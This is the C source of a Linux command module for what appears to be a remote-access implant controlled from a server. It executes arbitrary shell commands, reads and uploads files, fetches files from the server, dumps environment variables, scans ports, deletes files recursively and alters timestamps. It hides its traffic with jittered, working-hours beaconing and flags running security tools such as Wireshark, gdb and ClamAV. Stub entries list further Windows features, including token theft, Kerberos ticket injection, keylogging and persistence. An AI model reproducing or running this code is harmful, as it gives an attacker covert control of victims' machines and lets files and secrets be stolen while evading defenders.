/* commands_linux.c — Linux command dispatcher for the C agent.
 * Implements dispatch_task(), sleep_ms_jitter(), in_working_hours(),
 * sleep_until_work_hours(), and screenwatch_tick() for non-Windows targets.
 *
 * Core commands: SHELL, SLEEP, SYSINFO, PS, PS_JSON, PWD, CD, LS, LS_JSON,
 *                GETPID, CONFIG, KILL, CAT, MKDIR, RM, UPLOAD, DOWNLOAD,
 *                ENV, PORT_SCAN.
 * Windows-only commands return "[not supported on linux]".
 */
#ifndef _WIN32

#include "commands.h"
#include "transport.h"
#include "config.h"
#include "evasion.h"
#include "b64.h"
#include "platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <pwd.h>
#include <sys/utsname.h>

/* ── Globals ─────────────────────────────────────────────────────────────── */
char g_working_hours[32] = {0};
int  g_sleep_sec         = AGENT_SLEEP_SEC;
int  g_jitter_pct        = AGENT_JITTER_PCT;

/* ── Shell execution ─────────────────────────────────────────────────────── */
static char* run_shell(const char *cmd) {
    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "/bin/sh -c \"%s\" 2>&1", cmd);

    FILE *f = popen(full_cmd, "r");
    if (!f) return strdup("[error: popen failed]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { pclose(f); return strdup("[error: oom]"); }

    int c;
    while ((c = fgetc(f)) != EOF) {
        if (len + 2 >= cap) {
            cap *= 2;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        buf[len++] = (char)c;
    }
    buf[len] = '\0';
    pclose(f);
    return buf;
}

/* Escape an argument for the /bin/sh -c wrapper used by run_shell().  The
 * extra backslashes preserve the inner double quotes through that wrapper. */
static void shell_quote_arg(const char *in, char *out, size_t out_sz) {
    size_t j = 0;
    if (!out_sz) return;
    if (j + 2 < out_sz) { out[j++] = '\\'; out[j++] = '"'; }
    for (size_t i = 0; in && in[i] && j + 3 < out_sz; i++) {
        unsigned char c = (unsigned char)in[i];
        if (c == '"' || c == '\\' || c == '$' || c == '`') out[j++] = '\\';
        out[j++] = (char)c;
    }
    if (j + 2 < out_sz) { out[j++] = '\\'; out[j++] = '"'; }
    out[j] = '\0';
}

static void json_get_str(const char *json, const char *key, char *out,
                         size_t out_sz, const char *def) {
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!json || !agent_json_str(json, key, out, out_sz) || !out[0]) {
        if (def) strncpy(out, def, out_sz - 1);
        out[out_sz - 1] = '\0';
    }
}

/* ── Working hours ───────────────────────────────────────────────────────── */
int in_working_hours(void) {
    if (!g_working_hours[0]) return 1;
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return 1;
    int sh = 0, sm = 0, eh = 0, em = 0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    sscanf(dash + 1, "%d:%d", &eh, &em);

    time_t now = time(NULL);
    struct tm lt;
    localtime_r(&now, &lt);
    int cur = lt.tm_hour * 60 + lt.tm_min;
    int s = sh * 60 + sm, e = eh * 60 + em;
    if (s <= e) return cur >= s && cur < e;
    return cur >= s || cur < e;
}

void sleep_until_work_hours(void) {
    if (!g_working_hours[0]) return;
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return;
    int sh = 0, sm = 0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);

    time_t now = time(NULL);
    struct tm lt;
    localtime_r(&now, &lt);
    int cur   = lt.tm_hour * 60 + lt.tm_min;
    int s     = sh * 60 + sm;
    int wait_min = (cur < s) ? s - cur : (24 * 60 - cur) + s;
    if (wait_min > 0) sleep_masked((unsigned long)wait_min * 60UL * 1000UL);
}

/* ── Jitter sleep ────────────────────────────────────────────────────────── */
unsigned long sleep_ms_jitter(void) {
    unsigned long base = (unsigned long)g_sleep_sec * 1000UL;
    if (g_jitter_pct <= 0) return base;
    unsigned long jit = base * (unsigned long)g_jitter_pct / 100UL;

    /* Use getrandom (Linux 3.17+) or fall back to /dev/urandom */
    unsigned long r = 0;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        if (read(fd, &r, sizeof(r)) != sizeof(r)) r = (unsigned long)time(NULL);
        close(fd);
    } else {
        r = (unsigned long)time(NULL);
    }

    if (jit > 0) {
        long long delta = (long long)(r % (jit * 2UL + 1UL)) - (long long)jit;
        long long ms    = (long long)base + delta;
        if (ms < 1000LL) ms = 1000LL;
        return (unsigned long)ms;
    }
    return base;
}

/* ── Directory listing ───────────────────────────────────────────────────── */
static void escape_json_str(char *out, size_t outsz, const char *in) {
    size_t o = 0;
    for (size_t i = 0; in[i] && o + 3 < outsz; i++) {
        if      (in[i] == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
        else if (in[i] == '"')  { out[o++] = '\\'; out[o++] = '"'; }
        else                      out[o++] = in[i];
    }
    out[o] = '\0';
}

static char* do_ls(const char *path) {
    char dir[MAX_PATH];
    if (!path || !path[0]) {
        if (!getcwd(dir, sizeof(dir))) strncpy(dir, ".", sizeof(dir) - 1);
    } else {
        strncpy(dir, path, sizeof(dir) - 1);
    }

    DIR *d = opendir(dir);
    if (!d) return strdup("[error listing]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { closedir(d); return strdup("[oom]"); }
    buf[0] = '\0';

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s/%s", dir, ent->d_name);

        struct stat st;
        const char *kind = "F";
        if (stat(full, &st) == 0 && S_ISDIR(st.st_mode)) kind = "D";

        char line[MAX_PATH + 8];
        int ll = snprintf(line, sizeof(line), "%s  %s\n", kind, full);
        if (ll < 0) continue;
        if (len + (size_t)ll + 2 >= cap) {
            cap = len + (size_t)ll + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        memcpy(buf + len, line, (size_t)ll);
        len += (size_t)ll;
        buf[len] = '\0';
    }
    closedir(d);
    return buf;
}

static char* do_ls_json(const char *path) {
    char dir[MAX_PATH];
    if (!path || !path[0]) {
        if (!getcwd(dir, sizeof(dir))) strncpy(dir, ".", sizeof(dir) - 1);
    } else {
        strncpy(dir, path, sizeof(dir) - 1);
    }

    char cwd[MAX_PATH];
    if (!getcwd(cwd, sizeof(cwd))) strncpy(cwd, ".", sizeof(cwd) - 1);

    char cwd_esc[MAX_PATH * 2], dir_esc[MAX_PATH * 2];
    escape_json_str(cwd_esc, sizeof(cwd_esc), cwd);
    escape_json_str(dir_esc, sizeof(dir_esc), dir);

    size_t cap = 16384, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) return strdup("{\"error\":\"oom\"}");

    len = (size_t)snprintf(buf, cap,
        "{\"cwd\":\"%s\",\"path\":\"%s\",\"entries\":[", cwd_esc, dir_esc);

    DIR *d = opendir(dir);
    if (!d) {
        snprintf(buf + len, cap - len, "]}");
        return buf;
    }

    int first = 1;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s/%s", dir, ent->d_name);

        struct stat st;
        int is_dir = 0;
        long long sz = 0;
        char mod[32] = "unknown";
        if (stat(full, &st) == 0) {
            is_dir = S_ISDIR(st.st_mode);
            sz     = (long long)st.st_size;
            struct tm mt;
            localtime_r(&st.st_mtime, &mt);
            snprintf(mod, sizeof(mod), "%04d-%02d-%02d %02d:%02d",
                mt.tm_year + 1900, mt.tm_mon + 1, mt.tm_mday,
                mt.tm_hour, mt.tm_min);
        }

        char name_esc[MAX_PATH * 2];
        escape_json_str(name_esc, sizeof(name_esc), ent->d_name);

        char entry[MAX_PATH * 3];
        int elen = snprintf(entry, sizeof(entry),
            "%s{\"name\":\"%s\",\"is_dir\":%s,\"size\":%lld,\"mod\":\"%s\"}",
            first ? "" : ",", name_esc, is_dir ? "true" : "false", sz, mod);
        first = 0;

        if (elen < 0) continue;
        if (len + (size_t)elen + 4 >= cap) {
            cap = len + (size_t)elen + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        memcpy(buf + len, entry, (size_t)elen);
        len += (size_t)elen;
    }
    closedir(d);
    if (len + 4 >= cap) { char *nb = (char*)realloc(buf, len + 8); if (nb) buf = nb; }
    buf[len++] = ']'; buf[len++] = '}'; buf[len] = '\0';
    return buf;
}

/* ── Sysinfo ─────────────────────────────────────────────────────────────── */
static char* do_sysinfo(void) {
    char hostname[128] = "unknown";
    char username[128] = "unknown";
    char osinfo[256]   = "linux/amd64";

    gethostname(hostname, sizeof(hostname) - 1);

    struct passwd *pw = getpwuid(getuid());
    if (pw) strncpy(username, pw->pw_name, sizeof(username) - 1);

    struct utsname u;
    if (uname(&u) == 0)
        snprintf(osinfo, sizeof(osinfo), "%s/%s %s", u.sysname, u.machine, u.release);

    /* Read /etc/os-release for distro name */
    char distro[128] = "";
    FILE *f = fopen("/etc/os-release", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
                /* strip quotes and newline */
                char *val = line + 12;
                if (*val == '"') val++;
                char *end = strrchr(val, '"');
                if (end) *end = '\0';
                end = strchr(val, '\n');
                if (end) *end = '\0';
                strncpy(distro, val, sizeof(distro) - 1);
                break;
            }
        }
        fclose(f);
    }

    char *buf = (char*)malloc(512);
    if (!buf) return strdup("oom");
    snprintf(buf, 512,
        "hostname=%s\nusername=%s\nos=%s\ndistro=%s\npid=%d\nuid=%d\neuid=%d",
        hostname, username, osinfo, distro,
        (int)getpid(), (int)getuid(), (int)geteuid());
    return buf;
}

/* ── PS_JSON ─────────────────────────────────────────────────────────────── */
static char* do_ps_json(void) {
    FILE *f = popen("ps -eo pid,comm --no-headers 2>/dev/null", "r");
    if (!f) return strdup("[]");

    size_t cap = 65536, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { pclose(f); return strdup("[]"); }
    buf[len++] = '[';

    static const char *SEC_TOOLS[] = {
        "wireshark","tcpdump","strace","ltrace","gdb","ida","ida64",
        "radare2","r2","clamav","clamd","sysdig",NULL
    };

    char line[256];
    int first = 1;
    while (fgets(line, sizeof(line), f)) {
        int pid = 0; char name[128] = {0};
        if (sscanf(line, "%d %127s", &pid, name) != 2) continue;
        const char *sec = "";
        for (int si = 0; SEC_TOOLS[si]; si++)
            if (strcasecmp(name, SEC_TOOLS[si]) == 0) { sec = "AV/EDR"; break; }

        char entry[256];
        int elen = snprintf(entry, sizeof(entry),
            "%s{\"pid\":%d,\"name\":\"%s\"%s%s}",
            first ? "" : ",", pid, name,
            sec[0] ? ",\"security\":\"" : "",
            sec[0] ? "AV/EDR\"" : "");
        first = 0;

        while (len + (size_t)elen + 4 >= cap) {
            cap *= 2;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) { pclose(f); buf[len++]=']'; buf[len]='\0'; return buf; }
            buf = nb;
        }
        memcpy(buf + len, entry, (size_t)elen);
        len += (size_t)elen;
    }
    pclose(f);
    buf[len++] = ']'; buf[len] = '\0';
    return buf;
}

/* ── Port scan ───────────────────────────────────────────────────────────── */
static char* do_port_scan(const char *args_json) {
    char host[128] = "127.0.0.1", ports_arg[512] = "80,443,445,3389,22,21,8080";
    int timeout_ms = 500;

    /* minimal JSON extraction */
    const char *p;
    if ((p = strstr(args_json, "\"host\"")) != NULL) {
        p = strchr(p + 6, '"'); if (p) { p++; size_t i=0; while(*p&&*p!='"'&&i<sizeof(host)-1) host[i++]=*p++; host[i]='\0'; }
    }
    if ((p = strstr(args_json, "\"ports\"")) != NULL) {
        p = strchr(p + 7, '"'); if (p) { p++; size_t i=0; while(*p&&*p!='"'&&i<sizeof(ports_arg)-1) ports_arg[i++]=*p++; ports_arg[i]='\0'; }
    }
    if ((p = strstr(args_json, "\"timeout\"")) != NULL) {
        p = strchr(p + 9, ':'); if (p) timeout_ms = atoi(p + 1);
    }

    size_t out_cap = 4096, out_len = 0;
    char *out_buf = (char*)malloc(out_cap);
    if (!out_buf) return strdup("[oom]");
    out_buf[0] = '\0';

    char ports_copy[512];
    strncpy(ports_copy, ports_arg, sizeof(ports_copy) - 1);
    char *tok = strtok(ports_copy, ",");
    while (tok) {
        int port = atoi(tok);
        tok = strtok(NULL, ",");
        if (port <= 0 || port > 65535) continue;

        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        /* Set non-blocking */
        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);

        struct addrinfo hints_2, *res_2 = NULL;
        memset(&hints_2, 0, sizeof(hints_2));
        hints_2.ai_family   = AF_INET;
        hints_2.ai_socktype = SOCK_STREAM;
        char ps[8]; snprintf(ps, sizeof(ps), "%d", port);
        int open_flag = 0;
        if (getaddrinfo(host, ps, &hints_2, &res_2) == 0 && res_2) {
            connect(fd, res_2->ai_addr, res_2->ai_addrlen);
            freeaddrinfo(res_2);
            fd_set wfds;
            FD_ZERO(&wfds); FD_SET(fd, &wfds);
            struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
            if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0) {
                int err = 0; socklen_t el = sizeof(err);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el);
                if (err == 0) open_flag = 1;
            }
        }
        close(fd);

        if (open_flag) {
            char line[128];
            int ll = snprintf(line, sizeof(line), "OPEN %s:%d\n", host, port);
            if (ll > 0) {
                if (out_len + (size_t)ll + 2 >= out_cap) {
                    out_cap += 4096;
                    char *nb = (char*)realloc(out_buf, out_cap);
                    if (nb) out_buf = nb;
                }
                memcpy(out_buf + out_len, line, (size_t)ll);
                out_len += (size_t)ll;
                out_buf[out_len] = '\0';
            }
        }
    }
    if (out_len == 0) strcpy(out_buf, "[no open ports found]");
    return out_buf;
}

/* ── screenwatch (no-op on Linux — no GUI by default) ───────────────────── */
void screenwatch_tick(void) {}

/* ── Main dispatcher ─────────────────────────────────────────────────────── */
void dispatch_task(AgentTask *task) {
    const char *args = task->args ? task->args : "";

    char type_upper[64];
    strncpy(type_upper, task->type, sizeof(type_upper) - 1);
    for (int i = 0; type_upper[i]; i++)
        type_upper[i] = (char)toupper((unsigned char)type_upper[i]);

    /* ── Core commands ── */

    if (strcmp(type_upper, "SHELL") == 0) {
        char *out = run_shell(args);
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "SLEEP") == 0) {
        int sec = -1, jit = -1;
        sscanf(args, "%d %d", &sec, &jit);
        if (sec >= 0) g_sleep_sec  = sec;
        if (jit >= 0) g_jitter_pct = jit;
        agent_send_result(task->id, "[+] sleep updated", "");

    } else if (strcmp(type_upper, "SYSINFO") == 0) {
        char *out = do_sysinfo();
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "PS") == 0) {
        char *out = run_shell("ps aux 2>&1");
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "PS_JSON") == 0) {
        char *out = do_ps_json();
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "PWD") == 0) {
        char cwd[MAX_PATH] = {0};
        if (!getcwd(cwd, sizeof(cwd))) strncpy(cwd, ".", sizeof(cwd) - 1);
        agent_send_result(task->id, cwd, "");

    } else if (strcmp(type_upper, "CD") == 0) {
        if (chdir(args) == 0) {
            char cwd[MAX_PATH] = {0};
            if (!getcwd(cwd, sizeof(cwd))) strncpy(cwd, args, sizeof(cwd) - 1);
            agent_send_result(task->id, cwd, "");
        } else {
            char err[128];
            snprintf(err, sizeof(err), "cd: %s", strerror(errno));
            agent_send_result(task->id, "", err);
        }

    } else if (strcmp(type_upper, "LS") == 0) {
        char *out = do_ls(args);
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "LS_JSON") == 0) {
        char *out = do_ls_json(args);
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "GETPID") == 0) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%d", (int)getpid());
        agent_send_result(task->id, buf, "");

    } else if (strcmp(type_upper, "CONFIG") == 0) {
        int new_sec = -1, new_jit = -1;
        const char *p = strstr(args, "\"sleep_sec\"");
        if (p) { p = strchr(p + 11, ':'); if (p) sscanf(p + 1, " %d", &new_sec); }
        p = strstr(args, "\"jitter_pct\"");
        if (p) { p = strchr(p + 12, ':'); if (p) sscanf(p + 1, " %d", &new_jit); }
        p = strstr(args, "\"working_hours\"");
        if (p) {
            p = strchr(p + 15, '"'); if (p) {
                p++; size_t i = 0;
                while (*p && *p != '"' && i < 31) g_working_hours[i++] = *p++;
                g_working_hours[i] = '\0';
            }
        }
        if (new_sec >= 0) g_sleep_sec  = new_sec;
        if (new_jit >= 0) g_jitter_pct = new_jit;
        agent_send_result(task->id, "[+] config updated", "");

    } else if (strcmp(type_upper, "KILL") == 0) {
        agent_send_result(task->id, "bye", "");
        _exit(0);

    } else if (strcmp(type_upper, "CAT") == 0) {
        FILE *f = fopen(args, "rb");
        if (!f) {
            char err[128]; snprintf(err, sizeof(err), "open: %s", strerror(errno));
            agent_send_result(task->id, "", err);
        } else {
            fseek(f, 0, SEEK_END);
            long fsz = ftell(f);
            rewind(f);
            char *buf = (char*)malloc((size_t)fsz + 1);
            if (!buf) { fclose(f); agent_send_result(task->id, "", "oom"); }
            else {
                size_t rd = fread(buf, 1, (size_t)fsz, f);
                buf[rd] = '\0';
                fclose(f);
                agent_send_result(task->id, buf, "");
                free(buf);
            }
        }

    } else if (strcmp(type_upper, "MKDIR") == 0) {
        if (mkdir(args, 0755) == 0 || errno == EEXIST)
            agent_send_result(task->id, "[+] created", "");
        else {
            char err[128]; snprintf(err, sizeof(err), "mkdir: %s", strerror(errno));
            agent_send_result(task->id, "", err);
        }

    } else if (strcmp(type_upper, "RM") == 0) {
        struct stat st;
        if (stat(args, &st) == 0 && S_ISDIR(st.st_mode)) {
            /* recurse via shell */
            char cmd[MAX_PATH + 32];
            snprintf(cmd, sizeof(cmd), "rm -rf \"%s\" 2>&1", args);
            char *out = run_shell(cmd);
            agent_send_result(task->id, out[0] ? out : "[+] removed", "");
            free(out);
        } else {
            if (remove(args) == 0)
                agent_send_result(task->id, "[+] removed", "");
            else {
                char err[128]; snprintf(err, sizeof(err), "rm: %s", strerror(errno));
                agent_send_result(task->id, "", err);
            }
        }

    } else if (strcmp(type_upper, "CP") == 0 || strcmp(type_upper, "MV") == 0) {
        char src[MAX_PATH] = {0}, dst[MAX_PATH] = {0};
        json_get_str(args, "src", src, sizeof(src), "");
        json_get_str(args, "dst", dst, sizeof(dst), "");
        if (!src[0] || !dst[0]) {
            agent_send_result(task->id, "", "usage: {src,dst}");
        } else {
            char qsrc[MAX_PATH * 2], qdst[MAX_PATH * 2], cmd[MAX_PATH * 4 + 32];
            shell_quote_arg(src, qsrc, sizeof(qsrc));
            shell_quote_arg(dst, qdst, sizeof(qdst));
            snprintf(cmd, sizeof(cmd), "%s -R %s %s 2>&1",
                     strcmp(type_upper, "CP") == 0 ? "cp" : "mv", qsrc, qdst);
            char *out = run_shell(cmd);
            if (out && out[0]) agent_send_result(task->id, out, "");
            else agent_send_result(task->id, "[+] filesystem operation completed", "");
            free(out);
        }

    } else if (strcmp(type_upper, "GREP") == 0) {
        char pattern[512] = {0}, path[MAX_PATH] = {0};
        json_get_str(args, "pattern", pattern, sizeof(pattern), "");
        json_get_str(args, "path", path, sizeof(path), ".");
        if (!pattern[0]) {
            agent_send_result(task->id, "", "usage: {pattern,path}");
        } else {
            char qp[1024], qpath[MAX_PATH * 2], cmd[MAX_PATH * 3 + 64];
            shell_quote_arg(pattern, qp, sizeof(qp));
            shell_quote_arg(path, qpath, sizeof(qpath));
            snprintf(cmd, sizeof(cmd), "grep -R -n -- %s %s 2>&1", qp, qpath);
            char *out = run_shell(cmd);
            agent_send_result(task->id, out ? out : "", "");
            free(out);
        }

    } else if (strcmp(type_upper, "MOUNT") == 0) {
        char path[MAX_PATH] = {0};
        if (args[0] == '{') json_get_str(args, "path", path, sizeof(path), "");
        else strncpy(path, args, sizeof(path) - 1);
        char qpath[MAX_PATH * 2], cmd[MAX_PATH * 2 + 16];
        if (path[0]) {
            shell_quote_arg(path, qpath, sizeof(qpath));
            snprintf(cmd, sizeof(cmd), "mount %s 2>&1", qpath);
        } else snprintf(cmd, sizeof(cmd), "mount 2>&1");
        char *out = run_shell(cmd);
        agent_send_result(task->id, out ? out : "", "");
        free(out);

    } else if (strcmp(type_upper, "CHMOD") == 0) {
        char mode_str[32] = {0}, path[MAX_PATH] = {0};
        json_get_str(args, "mode", mode_str, sizeof(mode_str), "");
        json_get_str(args, "path", path, sizeof(path), "");
        char *end = NULL;
        long mode = strtol(mode_str, &end, 8);
        if (!mode_str[0] || !path[0] || !end || *end != '\0' || mode < 0 || mode > 07777) {
            agent_send_result(task->id, "", "usage: {mode,path}");
        } else if (chmod(path, (mode_t)mode) != 0) {
            char err[128]; snprintf(err, sizeof(err), "chmod: %s", strerror(errno));
            agent_send_result(task->id, "", err);
        } else agent_send_result(task->id, "[+] chmod updated", "");

    } else if (strcmp(type_upper, "CHOWN") == 0) {
        char owner[128] = {0}, group[128] = {0}, path[MAX_PATH] = {0};
        json_get_str(args, "owner", owner, sizeof(owner), "");
        json_get_str(args, "group", group, sizeof(group), "");
        json_get_str(args, "path", path, sizeof(path), "");
        if (!owner[0] || !path[0]) {
            agent_send_result(task->id, "", "usage: {owner,group,path}");
        } else {
            char who[256], qw[MAX_PATH * 2], qp[MAX_PATH * 2], cmd[MAX_PATH * 3 + 64];
            snprintf(who, sizeof(who), "%s%s%s", owner, group[0] ? ":" : "", group);
            shell_quote_arg(who, qw, sizeof(qw)); shell_quote_arg(path, qp, sizeof(qp));
            snprintf(cmd, sizeof(cmd), "chown %s %s 2>&1", qw, qp);
            char *out = run_shell(cmd);
            agent_send_result(task->id, out ? out : "", "");
            free(out);
        }

    } else if (strcmp(type_upper, "CHTIMES") == 0) {
        char mtime[64] = {0}, path[MAX_PATH] = {0};
        json_get_str(args, "mtime", mtime, sizeof(mtime), "");
        json_get_str(args, "path", path, sizeof(path), "");
        if (!mtime[0] || !path[0]) {
            agent_send_result(task->id, "", "usage: {mtime,path}");
        } else {
            char qm[128], qp[MAX_PATH * 2], cmd[MAX_PATH * 2 + 64];
            shell_quote_arg(mtime, qm, sizeof(qm)); shell_quote_arg(path, qp, sizeof(qp));
            snprintf(cmd, sizeof(cmd), "touch -d %s %s 2>&1", qm, qp);
            char *out = run_shell(cmd);
            agent_send_result(task->id, out && out[0] ? out : "[+] timestamps updated", "");
            free(out);
        }

    } else if (strcmp(type_upper, "UPLOAD") == 0) {
        char filename[256] = {0}, remote_path[MAX_PATH] = {0};
        const char *p = strstr(args, "\"filename\"");
        if (p) { p = strchr(p + 10, '"'); if (p) { p++; size_t i=0; while(*p&&*p!='"'&&i<sizeof(filename)-1) filename[i++]=*p++; filename[i]='\0'; } }
        p = strstr(args, "\"remote_path\"");
        if (p) { p = strchr(p + 13, '"'); if (p) { p++; size_t i=0; while(*p&&*p!='"'&&i<sizeof(remote_path)-1) remote_path[i++]=*p++; remote_path[i]='\0'; } }
        if (!filename[0] || !remote_path[0]) {
            agent_send_result(task->id, "", "upload: missing fields"); return;
        }
        size_t data_len = 0;
        uint8_t *data = agent_download_file(filename, &data_len);
        if (!data) { agent_send_result(task->id, "", "download from server failed"); return; }
        FILE *hf = fopen(remote_path, "wb");
        if (!hf) {
            free(data);
            char err[128]; snprintf(err, sizeof(err), "write: %s", strerror(errno));
            agent_send_result(task->id, "", err); return;
        }
        fwrite(data, 1, data_len, hf);
        fclose(hf); free(data);
        char msg[256];
        snprintf(msg, sizeof(msg), "written %zu bytes to %s", data_len, remote_path);
        agent_send_result(task->id, msg, "");

    } else if (strcmp(type_upper, "DOWNLOAD") == 0) {
        FILE *f = fopen(args, "rb");
        if (!f) {
            char err[128]; snprintf(err, sizeof(err), "read: %s", strerror(errno));
            agent_send_result(task->id, "", err); return;
        }
        fseek(f, 0, SEEK_END);
        long fsz = ftell(f); rewind(f);
        uint8_t *buf = (uint8_t*)malloc((size_t)fsz);
        if (!buf) { fclose(f); agent_send_result(task->id, "", "oom"); return; }
        size_t rd = fread(buf, 1, (size_t)fsz, f);
        fclose(f);
        const char *name = strrchr(args, '/');
        name = name ? name + 1 : args;
        agent_upload_file(task->id, name, buf, rd);
        free(buf);
        char msg[128];
        snprintf(msg, sizeof(msg), "uploaded %zu bytes", rd);
        agent_send_result(task->id, msg, "");

    } else if (strcmp(type_upper, "ENV") == 0) {
        char *out = run_shell("env 2>&1");
        agent_send_result(task->id, out, "");
        free(out);

    } else if (strcmp(type_upper, "PORT_SCAN") == 0) {
        char *out = do_port_scan(args);
        agent_send_result(task->id, out, "");
        free(out);

    /* ── Windows-only stubs ── */
    } else if (strcmp(type_upper, "SCREENSHOT")    == 0 ||
               strcmp(type_upper, "SCREENWATCH")   == 0 ||
               strcmp(type_upper, "INJECT_REMOTE") == 0 ||
               strcmp(type_upper, "INJECT_APC")    == 0 ||
               strcmp(type_upper, "TOKEN_STEAL")   == 0 ||
               strcmp(type_upper, "TOKEN_MAKE")    == 0 ||
               strcmp(type_upper, "TOKEN_DROP")    == 0 ||
               strcmp(type_upper, "TOKEN_WHOAMI")  == 0 ||
               strcmp(type_upper, "GETSYSTEM")     == 0 ||
               strcmp(type_upper, "PERSIST")       == 0 ||
               strcmp(type_upper, "PERSIST_RM")    == 0 ||
               strcmp(type_upper, "REG_QUERY")     == 0 ||
               strcmp(type_upper, "REG_LIST")      == 0 ||
               strcmp(type_upper, "REG_SET")       == 0 ||
               strcmp(type_upper, "REG_DELETE")    == 0 ||
               strcmp(type_upper, "MINIDUMP")      == 0 ||
               strcmp(type_upper, "KERB_LIST")     == 0 ||
               strcmp(type_upper, "KERB_PTT")      == 0 ||
               strcmp(type_upper, "KERB_PURGE")    == 0 ||
               strcmp(type_upper, "EXEC_PE")       == 0 ||
               strcmp(type_upper, "DOTNET_EXEC")   == 0 ||
               strcmp(type_upper, "PPID")          == 0 ||
               strcmp(type_upper, "HW_BP_CHECK")   == 0 ||
               strcmp(type_upper, "HWBP_CLEAR")    == 0 ||
               strcmp(type_upper, "WIPE_MZ")       == 0 ||
               strcmp(type_upper, "SOCKS5")        == 0 ||
               strcmp(type_upper, "KEYLOG_START")  == 0 ||
               strcmp(type_upper, "KEYLOG_DUMP")   == 0 ||
               strcmp(type_upper, "CLIP_START")    == 0 ||
               strcmp(type_upper, "CLIP_DUMP")     == 0 ||
               strcmp(type_upper, "GPP_DECRYPT")   == 0) {
        agent_send_result(task->id, "", "[not supported on linux]");

    } else {
        char err[128];
        snprintf(err, sizeof(err), "unknown command: %s", task->type);
        agent_send_result(task->id, "", err);
    }
}

#endif /* !_WIN32 */
